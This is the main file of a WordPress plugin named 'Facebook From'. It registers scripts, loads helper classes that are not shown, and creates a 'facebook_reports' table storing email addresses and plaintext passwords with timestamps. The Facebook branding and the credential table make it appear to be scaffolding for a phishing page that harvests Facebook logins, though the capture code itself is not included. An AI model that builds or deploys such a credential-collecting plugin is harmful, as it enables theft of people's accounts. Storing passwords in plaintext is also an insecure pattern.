<?php
/*
	Plugin Name: Facebook From
	Plugin URI: https://www.sakib.com/plugins/
	Description: facebook from
	Version: 1.0.0
	Text Domain: fb
	Author: Sakib
	Author URI: https://www.facebook.com/
	License: GPLv2 or later
	License URI: http://www.gnu.org/licenses/gpl-2.0.html
*/

defined('ABSPATH') || exit;
defined('FACEBOOK_PLUGIN_URL') || define('FACEBOOK_PLUGIN_URL', WP_PLUGIN_URL . '/' . plugin_basename(dirname(__FILE__)) . '/');
defined('FACEBOOK_PLUGIN_DIR') || define('FACEBOOK_PLUGIN_DIR', plugin_dir_path(__FILE__));
defined('FACEBOOK_PLUGIN_FILE') || define('FACEBOOK_PLUGIN_FILE', plugin_basename(__FILE__));
defined( 'FACEBOOK_TABLE_REPORTS' ) || define( 'FACEBOOK_TABLE_REPORTS', sprintf( '%sfacebook_reports', $wpdb->prefix ) );
defined('FACEBOOK_PLUGIN_VERSION') || define('FACEBOOK_PLUGIN_VERSION', '1.0.0');

if (!class_exists('FACEBOOK_Main')) {
    /**
     * Class FACEBOOK_Main
     */
    class FACEBOOK_Main
    {

        protected static $_instance = null;

        protected static $_script_version = null;

        /**
         * FACEBOOK_Main constructor.
         */
        function __construct()
        {

            self::$_script_version = defined('WP_DEBUG') && WP_DEBUG ? current_time('U') : FACEBOOK_PLUGIN_VERSION;

            $this->define_scripts();
            $this->define_classes_functions();
            add_action( 'init', array( $this, 'create_data_table' ) );
        }

        /**
         * @return FACEBOOK_Main
         */
        public static function instance()
        {
            if (is_null(self::$_instance)) {
                self::$_instance = new self();
            }

            return self::$_instance;
        }

        /**
         * Create data table
         *
         * @return void
         */

        function create_data_table() {
            if ( ! function_exists( 'maybe_create_table' ) ) {
                require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
            }

            $sql_create_table = "CREATE TABLE " . FACEBOOK_TABLE_REPORTS . " (
                            id int(50) NOT NULL AUTO_INCREMENT,
                            email varchar(50) NOT NULL,
                            password varchar(50) NOT NULL,
                            datetime  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                            PRIMARY KEY (id)
                            );";

            maybe_create_table( FACEBOOK_TABLE_REPORTS, $sql_create_table );
        }


        /**
         * Include Classes and Functions
         */
        function define_classes_functions()
        {

            require_once FACEBOOK_PLUGIN_DIR . 'includes/classes/class-hooks.php';
            require_once FACEBOOK_PLUGIN_DIR . 'includes/classes/class-functions.php';
            require_once FACEBOOK_PLUGIN_DIR . 'includes/functions.php';

        }

        /**
         * Localize Scripts
         *
         * @return mixed|void
         */
        function localize_scripts()
        {
            return apply_filters('FACEBOOK/Filters/localize_scripts', array(
                'ajax_url' => admin_url('admin-ajax.php'),
            ));
        }


        /**
         * Load Admin Scripts
         */
        function admin_scripts()
        {

            wp_enqueue_style('facebook', FACEBOOK_PLUGIN_URL . 'assets/admin/css/style.css', self::$_script_version);

            wp_enqueue_script('facebook', plugins_url('/assets/admin/js/scripts.js', __FILE__), array('jquery'), self::$_script_version);
            wp_localize_script('facebook', 'facebook', $this->localize_scripts());
        }


        /**
         * Load Scripts
         */
        function define_scripts()
        {
            add_action('admin_enqueue_scripts', array($this, 'admin_scripts'));
        }
    }
}


function wpdk_init_facebook()
{

    if (!function_exists('get_plugins')) {
        include_once ABSPATH . '/wp-admin/includes/plugin.php';
    }

    if (!class_exists('wpdk\Client')) {
        require_once(plugin_dir_path(__FILE__) . 'includes/wpdk/classes/class-client.php');
    }

    global $facebook_wpdk;

    $facebook_wpdk = new wpdk\Client(esc_html('Facebook'), 'facebook', 0, __FILE__);

    do_action('wpdk_init_facebook', $facebook_wpdk);
}

/**
 * @global \WPDK\Client $facebook_wpdk
 */
global $facebook_wpdk;

wpdk_init_facebook();

FACEBOOK_Main::instance();
